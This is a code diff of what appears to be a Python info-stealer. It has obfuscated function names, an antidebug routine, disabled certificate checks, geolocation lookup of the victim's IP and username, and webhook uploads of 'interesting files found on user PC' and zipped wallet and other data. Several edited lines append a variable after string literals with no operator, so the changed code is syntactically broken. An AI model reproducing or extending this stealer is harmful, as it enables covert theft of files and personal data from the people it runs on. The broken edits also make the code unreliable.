@@ -1,3 +1,5 @@
+token2 = token
+
 ssl._create_default_https_context = ssl._create_unverified_context
 
 def antidebug():
@@ -166,7 +168,7 @@ def L04DUr118(h00k, data='', files='', headers=''):
 
 def g108411NF0():
     ip = g371P()
-    username = os.getenv("USERNAME", token)
+    username = os.getenv("USERNAME")
     ipdatanojson = urlopen(Request(f"https://geolocation-db.com/jsonp/{ip}")).read().decode().replace('callback(', '').replace('})', '}')
     # print(ipdatanojson)
     ipdata = loads(ipdatanojson)
@@ -518,7 +520,7 @@ def UP104D(name, link):
                 "color": 2895667,
                 "fields": [
                     {
-                    "name": "Interesting files found on user PC:",
+                    "name": "Interesting files found on user PC:" token2,
                     "value": link
                     }
                 ],
@@ -706,7 +708,7 @@ def G47H3rZ1P5(paths1, paths2, paths3):
         "content": g108411NF0(),
         "embeds": [
             {
-            "title": f"{cname} Zips",
+            "title": f"{cname} Zips" token2,
             "description": f"{wal}\n{ga}\n{ot}",
             "color": 2895667,
             "footer": {
